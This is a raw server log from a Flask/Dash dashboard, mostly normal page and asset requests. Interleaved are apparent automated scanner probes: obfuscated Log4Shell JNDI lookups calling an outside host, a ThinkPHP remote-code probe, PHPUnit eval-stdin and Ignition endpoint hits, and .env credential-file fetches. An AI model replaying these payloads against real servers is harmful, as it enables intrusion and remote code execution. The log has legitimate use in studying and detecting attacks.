Dash is running on http://0.0.0.0:8050/

 * Serving Flask app 'main' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.0.8.4:8050/ (Press CTRL+C to quit)
127.0.0.1 - - [06/May/2022 04:01:28] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 04:16:30] "[31m[1mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 405 -
127.0.0.1 - - [06/May/2022 04:26:41] "GET / HTTP/1.0" 200 -
128.243.2.59 - - [06/May/2022 04:59:05] "POST /_dash-update-component HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 05:04:34] "GET /solr/admin/collections?action=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://37.0.8.32:1099/dfgm1h%7D HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 05:04:35] "GET /?x=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://37.0.8.32:1099/dfgm1h%7D HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 05:04:36] "GET /$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://37.0.8.32:1099/dfgm1h%7D HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 05:04:37] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 05:04:38] "GET /struts2-showcase/struts/utils.js HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 05:04:39] "[31m[1mPOST /$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://37.0.8.32:1099/dfgm1h%7D HTTP/1.0[0m" 405 -
127.0.0.1 - - [06/May/2022 05:04:40] "[31m[1mPOST /login HTTP/1.0[0m" 405 -
127.0.0.1 - - [06/May/2022 07:57:42] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 08:17:45] "GET /.env HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 08:17:45] "[31m[1mPOST / HTTP/1.0[0m" 405 -
127.0.0.1 - - [06/May/2022 08:32:26] "GET / HTTP/1.0" 200 -
128.243.2.59 - - [06/May/2022 08:36:30] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 08:36:35] "POST /_dash-update-component HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 08:41:42] "GET / HTTP/1.0" 200 -
128.243.2.59 - - [06/May/2022 09:05:38] "POST /_dash-update-component HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 10:07:07] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 10:07:08] "GET /webfig/ HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 10:33:58] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 11:10:48] "GET /console/ HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 11:26:27] "[31m[1mPOST /boaform/admin/formLogin HTTP/1.0[0m" 405 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET / HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/font.css?m=1651399939.8614802 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/deps/react@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/styles.css?m=1651684640.7613692 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/deps/polyfill@7.v2_3_1m1651401481.12.1.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/deps/react-dom@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/deps/prop-types@15.v2_3_1m1651401481.7.2.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/dash-renderer/build/dash_renderer.v2_3_1m1651401481.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.v2_3_0m1651401481.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/html/dash_html_components.v2_0_2m1651401481.min.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:02] "GET /_dash-component-suites/dash/dash_table/bundle.v5_1_1m1651401481.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:03] "GET /_dash-component-suites/dash/dcc/dash_core_components.v2_3_0m1651401481.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /_dash-layout HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /_dash-dependencies HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /assets/img/frisbee_logo_head.png HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /img/loading.png HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "POST /_dash-update-component HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:04] "GET /assets/img/loading.png HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:05] "POST /_dash-update-component HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:06] "GET /_dash-component-suites/dash/dash_table/async-table.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:06] "GET /_dash-component-suites/dash/dash_table/async-highlight.js HTTP/1.1" 200 -
60.249.3.226 - - [06/May/2022 11:50:23] "POST /_dash-update-component HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 11:54:35] "[31m[1mPOST /Autodiscover/Autodiscover.xml HTTP/1.0[0m" 405 -
127.0.0.1 - - [06/May/2022 12:48:30] "GET /_ignition/execute-solution HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 13:06:39] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 13:11:57] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 14:21:03] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 14:33:13] "GET /config/getuser?index=0 HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:10] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:10] "GET /robots.txt HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:12] "GET /sitemap.xml HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:13] "GET /.well-known/security.txt HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:13] "GET /_favicon.ico?v=2.3.1 HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:47:21] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:51:48] "GET /.env HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 16:51:50] "[31m[1mPOST / HTTP/1.0[0m" 405 -
183.240.132.29 - - [06/May/2022 18:42:56] "GET / HTTP/1.1" 200 -
119.147.2.150 - - [06/May/2022 18:43:08] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 18:45:59] "GET / HTTP/1.0" 200 -
82.132.246.75 - - [06/May/2022 19:07:54] "GET / HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/styles.css?m=1651684640.7613692 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/font.css?m=1651399939.8614802 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/deps/polyfill@7.v2_3_1m1651401481.12.1.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/deps/react@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/deps/react-dom@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/deps/prop-types@15.v2_3_1m1651401481.7.2.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/dash-renderer/build/dash_renderer.v2_3_1m1651401481.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:55] "GET /_dash-component-suites/dash/dcc/dash_core_components.v2_3_0m1651401481.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:56] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.v2_3_0m1651401481.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:56] "GET /_dash-component-suites/dash/html/dash_html_components.v2_0_2m1651401481.min.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:56] "GET /_dash-component-suites/dash/dash_table/bundle.v5_1_1m1651401481.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:57] "GET /_dash-dependencies HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:57] "GET /_dash-layout HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:58] "GET /assets/img/frisbee_logo_head.png HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:58] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:58] "GET /img/loading.png HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:58] "GET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:58] "GET /assets/img/loading.png HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:07:59] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:01] "GET /_dash-component-suites/dash/dash_table/async-highlight.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:01] "GET /_dash-component-suites/dash/dash_table/async-table.js HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:09] "GET / HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/styles.css?m=1651684640.7613692 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/font.css?m=1651399939.8614802 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "[36mGET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:10] "GET /_dash-layout HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:10] "GET /_dash-dependencies HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:11] "[36mGET /assets/img/frisbee_logo_head.png HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:11] "GET /img/loading.png HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:11] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:12] "[36mGET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:12] "[36mGET /assets/img/loading.png HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:12] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:08:17] "[36mGET /_dash-component-suites/dash/dash_table/async-table.js HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:17] "[36mGET /_dash-component-suites/dash/dash_table/async-highlight.js HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:08:22] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:10] "GET / HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/font.css?m=1651399939.8614802 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/styles.css?m=1651684640.7613692 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:11] "[36mGET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:12] "GET /_dash-layout HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:12] "GET /_dash-dependencies HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:12] "[36mGET /assets/img/frisbee_logo_head.png HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:12] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:12] "GET /img/loading.png HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:13] "[36mGET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:13] "[36mGET /assets/img/loading.png HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:14] "POST /_dash-update-component HTTP/1.1" 200 -
82.132.246.75 - - [06/May/2022 19:10:20] "[36mGET /_dash-component-suites/dash/dash_table/async-table.js HTTP/1.1[0m" 304 -
82.132.246.75 - - [06/May/2022 19:10:20] "[36mGET /_dash-component-suites/dash/dash_table/async-highlight.js HTTP/1.1[0m" 304 -
127.0.0.1 - - [06/May/2022 19:22:13] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 19:25:51] "GET / HTTP/1.0" 200 -
127.0.0.1 - - [06/May/2022 19:53:28] "GET / HTTP/1.0" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET / HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/deps/react@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/deps/react-dom@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/deps/polyfill@7.v2_3_1m1651401481.12.1.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/font.css?m=1651399939.8614802 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/styles.css?m=1651684640.7613692 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/deps/prop-types@15.v2_3_1m1651401481.7.2.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/dash-renderer/build/dash_renderer.v2_3_1m1651401481.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/dcc/dash_core_components.v2_3_0m1651401481.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.v2_3_0m1651401481.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/html/dash_html_components.v2_0_2m1651401481.min.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:56] "GET /_dash-component-suites/dash/dash_table/bundle.v5_1_1m1651401481.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:58] "GET /_dash-dependencies HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:58] "GET /_favicon.ico?v=2.3.1 HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:58] "GET /_dash-layout HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:58] "POST /_dash-update-component HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:58] "GET /assets/img/frisbee_logo_head.png HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:59] "GET /assets/img/loading.png HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:25:59] "GET /img/loading.png HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:26:00] "POST /_dash-update-component HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:26:00] "GET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:26:01] "GET /_dash-component-suites/dash/dash_table/async-highlight.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:26:02] "GET /_dash-component-suites/dash/dash_table/async-table.js HTTP/1.1" 200 -
118.140.213.251 - - [06/May/2022 20:41:10] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:47] "GET /assets/styles.css?m=1651684640.7613692 HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:47] "[36mGET /assets/font.css?m=1651399939.8614802 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:27:47] "GET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:47] "[36mGET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/dcc/dash_core_components.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/html/dash_html_components.min.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/dash_table/bundle.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/dcc/async-dropdown.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:48] "GET /_dash-component-suites/dash/dash_table/async-table.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:49] "GET /_dash-component-suites/dash/dash_table/async-highlight.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:57] "GET /assets/img/frisbee_logo_head.png HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:27:58] "GET /_dash-component-suites/dash/deps/polyfill@7.v2_3_1m1651401481.12.1.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:00] "GET /_dash-component-suites/dash/deps/react@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:00] "GET /_dash-component-suites/dash/deps/react-dom@16.v2_3_1m1651401481.14.0.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:01] "GET /_dash-component-suites/dash/deps/prop-types@15.v2_3_1m1651401481.7.2.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:02] "GET /_dash-component-suites/dash/dash-renderer/build/dash_renderer.v2_3_1m1651401481.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:03] "GET /_dash-component-suites/dash/dcc/dash_core_components.v2_3_0m1651401481.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:05] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.v2_3_0m1651401481.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:08] "GET /_dash-component-suites/dash/html/dash_html_components.v2_0_2m1651401481.min.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:28:11] "GET /_dash-component-suites/dash/dash_table/bundle.v5_1_1m1651401481.js HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/dcc/dash_core_components.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/dash_table/bundle.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/dcc/async-dropdown.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/html/dash_html_components.min.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:10] "GET /_dash-component-suites/dash/dash_table/async-highlight.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:11] "GET /_dash-component-suites/dash/dash_table/async-table.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:28] "GET /_dash-component-suites/dash/dcc/dash_core_components-shared.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:28] "GET /_dash-component-suites/dash/dcc/dash_core_components.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:28] "GET /_dash-component-suites/dash/dash_table/bundle.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:28] "GET /_dash-component-suites/dash/html/dash_html_components.min.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:28] "GET /_dash-component-suites/dash/dcc/async-dropdown.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:29] "GET /_dash-component-suites/dash/dash_table/async-highlight.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:29:30] "GET /_dash-component-suites/dash/dash_table/async-table.js.map HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:45:56] "GET / HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:54:25] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:54:27] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:54:56] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:55:04] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:56:52] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:56:58] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:00] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:03] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:19] "GET / HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/font.css?m=1651399939.8614802 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/css/styles.css?m=1651684639.7763503 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/css/font.css?m=1651399939.5454795 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/styles.css?m=1651684640.7613692 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/js/styleTablePages.js?m=1651399941.0064826 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:19] "[36mGET /assets/styleTablePages.js?m=1651399941.1154828 HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:20] "GET /_dash-layout HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:20] "GET /_dash-dependencies HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:20] "GET /_favicon.ico?v=2.3.1 HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:20] "[36mGET /assets/img/frisbee_logo_head.png HTTP/1.1[0m" 304 -
128.243.2.59 - - [06/May/2022 21:57:21] "GET /img/loading.png HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:21] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:21] "GET /_favicon.ico?v=2.3.1 HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:22] "GET /assets/img/loading.png HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:22] "POST /_dash-update-component HTTP/1.1" 200 -
128.243.2.59 - - [06/May/2022 21:57:22] "GET /_dash-component-suites/dash/dcc/async-dropdown.js HTTP/1.1" 200 -
